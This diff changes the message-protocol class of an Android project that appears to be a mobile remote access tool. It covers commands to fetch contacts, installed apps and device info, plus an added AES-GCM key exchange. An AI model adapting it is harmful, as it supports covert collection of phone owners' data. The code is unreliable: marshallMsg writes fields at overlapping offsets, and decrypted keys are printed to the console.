@@ -1,10 +1,18 @@
 package afernandezb92.mrat.messages;
+import android.util.Base64;
+
 import java.io.DataInputStream;
 import java.io.DataOutputStream;
 import java.io.IOException;
 import java.io.InputStream;
 import java.io.OutputStream;
+import java.io.UnsupportedEncodingException;
 import java.net.Socket;
+import java.sql.Timestamp;
+import java.util.Arrays;
+
+import afernandezb92.mrat.cipher.CipherAES;
+
 
 public abstract class Mensaje {
     protected static final int TGETCONTACT = 1;
@@ -14,10 +22,13 @@ public abstract class Mensaje {
     protected static final int RGETINSTALLEDAPPS = 5;
     protected static final int TGETINFO = 6;
     protected static final int RGETINFO = 7;
-    protected static final int TGETKEY = 8;
-    protected static final int RGETKEY = 9;
-    protected static final int ROK = 10;
-    protected static final int RERR = 11;
+    protected static final int TSENDID = 8;
+    protected static final int TGETKEY = 9;
+    protected static final int RGETKEY = 10;
+    protected static final int TSENDKEY = 11;
+    protected static final int ROK = 12;
+    protected static final int RERR = 13;
+    protected static final int INTSIZE = 4;
     private final int type;
     private final int tag;
     private static int taggen;
@@ -46,8 +57,8 @@ public abstract class Mensaje {
 
     public void writeTo(OutputStream o) throws Exception{
         DataOutputStream output =  new DataOutputStream(o);
-        output.writeInt(type);
-        output.writeInt(tag);
+        output.write(marshallInt(type));
+        output.write(marshallInt(tag));
     }
 
     protected abstract void readFrom (InputStream i) throws Exception;
@@ -57,8 +68,12 @@ public abstract class Mensaje {
         int type = 7;
         int tag = 0;
         DataInputStream incon = new DataInputStream(i);
-        type = incon.readInt();
-        tag = incon.readInt();
+        byte [] buffer = new byte[INTSIZE];
+        incon.read(buffer);
+        type = unmarshallInt(buffer);
+        buffer = new byte[INTSIZE];
+        incon.read(buffer);
+        tag = unmarshallInt(buffer);
         switch(type){
             case TGETCONTACT:
                 msg = new Mensaje.TGetContact(tag);
@@ -81,11 +96,17 @@ public abstract class Mensaje {
             case RGETINFO:
                 msg = new Mensaje.RGetInfo(tag);
                 break;
+            case TSENDID:
+                msg = new Mensaje.TSendId(tag);
+                break;
             case TGETKEY:
                 msg = new Mensaje.TGetKey(tag);
                 break;
             case RGETKEY:
                 msg = new Mensaje.RGetKey(tag);
+                break;
+            case TSENDKEY:
+                msg = new Mensaje.TSendKey(tag);
                 break;
             case ROK:
                 msg = new Mensaje.ROk(tag);
@@ -118,6 +139,9 @@ public abstract class Mensaje {
             case RGETINSTALLEDAPPS:
                 tp = "RGETINSTALLEDAPPS";
                 break;
+            case TSENDID:
+                tp = "TSENDID";
+                break;
             case TGETINFO:
                 tp = "TGETINFO";
                 break;
@@ -130,6 +154,9 @@ public abstract class Mensaje {
             case RGETKEY:
                 tp = "RGETKEY";
                 break;
+            case TSENDKEY:
+                tp = "TSENDKEY";
+                break;
             case ROK:
                 tp = "ROK";
                 break;
@@ -140,6 +167,49 @@ public abstract class Mensaje {
                 tp = "Mensaje Desconocido";
         }
         return tp;
+    }
+
+    public byte[] marshallMsg(byte[] key, byte[] keyMaster, Timestamp ts, int nonce) throws UnsupportedEncodingException{
+        byte[] msgBytes = new byte[key.length + keyMaster.length + marshallInt(nonce).length + ts.toString().getBytes("UTF-8").length];
+        System.arraycopy(key, 0, msgBytes, 0, key.length);
+        System.arraycopy(keyMaster, 0, msgBytes, key.length, keyMaster.length);
+        System.arraycopy(marshallInt(nonce), 0, msgBytes, keyMaster.length, marshallInt(nonce).length);
+        System.arraycopy(ts.toString().getBytes("UTF-8"), 0, msgBytes, keyMaster.length, ts.toString().getBytes("UTF-8").length);
+        return msgBytes;
+    }
+
+    public static byte[] marshallString(String s) throws UnsupportedEncodingException{
+        byte[] b;
+        b = s.getBytes("UTF-8");
+        int size = b.length;
+        byte[] marshall = new byte[size + INTSIZE];
+        System.arraycopy(marshallInt(size), 0, marshall, 0, INTSIZE);
+        System.arraycopy(b, 0, marshall, INTSIZE,size);
+        return marshall;
+    }
+
+    public static String unmarshallString(byte[] b) throws UnsupportedEncodingException{
+        String unmarshall = new String(b, "UTF-8");
+        return unmarshall;
+    }
+
+    public static byte[] marshallInt(int value){
+        byte[] marshall;
+        byte b3 = (byte)((value >> 24) & 0xFF);
+        byte b2 = (byte)((value >> 16) & 0xFF);
+        byte b1 = (byte)((value >> 8) & 0xFF);
+        byte b0 = (byte)(value & 0xFF);
+        marshall = new byte[]{b0 , b1, b2, b3};
+        return marshall;
+    }
+
+    public static int unmarshallInt(byte[] value){
+        int a, b, c, d;
+        a = (value[3] & 0xFF) << 24;
+        b = (value[2] & 0xFF) << 16;
+        c = (value[1] & 0xFF) << 8;
+        d =  value[0] & 0xFF;
+        return  a | b | c | d;
     }
 
     public static class TGetContact extends Mensaje{
@@ -406,22 +476,122 @@ public abstract class Mensaje {
         }
     }
 
+    public static class TSendKey extends Mensaje{
+        byte[] key, keyMaster, msgBytes;
+        Timestamp ts;
+        int nonce;
+
+        public TSendKey(int tag) {
+            super(tag, TSENDKEY);
+        }
+
+        public TSendKey(byte[] k, byte[] km, Timestamp t, int n){
+            super(newTag(), TSENDKEY);
+            key = k;
+            keyMaster = km;
+            ts = t;
+            nonce = n;
+        }
+
+        public byte[] getKeyEncrypt(){
+            return keyMaster;
+        }
+
+        public int getNonceEncrypt(){
+            return nonce;
+        }
+
+        protected void readFrom(InputStream i) throws Exception {
+            DataInputStream incon = new DataInputStream(i);
+            byte [] buffer = new byte[INTSIZE];
+            incon.read(buffer);
+            int size = unmarshallInt(buffer);
+            System.out.println("Size " + size);
+            buffer = new byte[size];
+            incon.read(buffer);
+            System.out.println("Msg: " + new String(Base64.encodeToString(buffer, Base64.DEFAULT)));
+            byte[] decipherMsg = new byte[size];
+            decipherMsg = CipherAES.decipherInGCMMode(buffer);
+            byte[] key = new byte[256/8];
+            key = Arrays.copyOfRange(decipherMsg, 0, 256/8);
+            System.out.println(new String(Base64.encodeToString(key, Base64.DEFAULT)));
+        }
+
+        public void writeTo(OutputStream o) throws Exception{
+            CipherAES cipher = new CipherAES(key);
+            super.writeTo(o);
+            DataOutputStream output = new DataOutputStream(o);
+            msgBytes = marshallMsg(key, keyMaster, ts, nonce);
+            output.write(cipher.cipherInGCMMode(msgBytes));
+        }
+
+    }
+
+    public static class TSendId extends Mensaje{
+        int id;
+
+        public TSendId(int i){
+            super(newTag(), TSENDID);
+            id = i;
+        }
+
+        public TSendId(Mensaje t, int i){
+            super(t.getTag(), TSENDID);
+            id = i;
+        }
+
+        public int getId(){
+            return id;
+        }
+
+        protected void readFrom(InputStream i) throws Exception {
+            DataInputStream incon = new DataInputStream(i);
+            id = incon.readInt();
+        }
+
+        public void writeTo(OutputStream o) throws Exception{
+            super.writeTo(o);
+            DataOutputStream output = new DataOutputStream(o);
+            output.writeInt(id);
+        }
+
+        public String toString(){
+            return super.toString() + " ID: " + id;
+        }
+    }
+
     public static class ROk extends Mensaje{
+        String timeStamp, nonce;
 
         public ROk(int tag){
             super(tag, ROK);
         }
 
-        public ROk(Mensaje t){
+        public ROk(Mensaje t, String ts, String n){
             super(t.getTag(), ROK);
+            timeStamp = ts;
+            nonce = n;
+        }
+
+        public String getNonce(){
+            return nonce;
+        }
+
+        public String getTimeStamp(){
+            return timeStamp;
         }
 
         protected void readFrom(InputStream i) throws Exception {
-            ;
+            DataInputStream incon = new DataInputStream(i);
+            timeStamp = incon.readUTF();
+            nonce = incon.readUTF();
         }
 
         public void writeTo(OutputStream o) throws Exception{
             super.writeTo(o);
+            DataOutputStream output = new DataOutputStream(o);
+            output.writeUTF(timeStamp);
+            output.writeUTF(nonce);
         }
     }
 
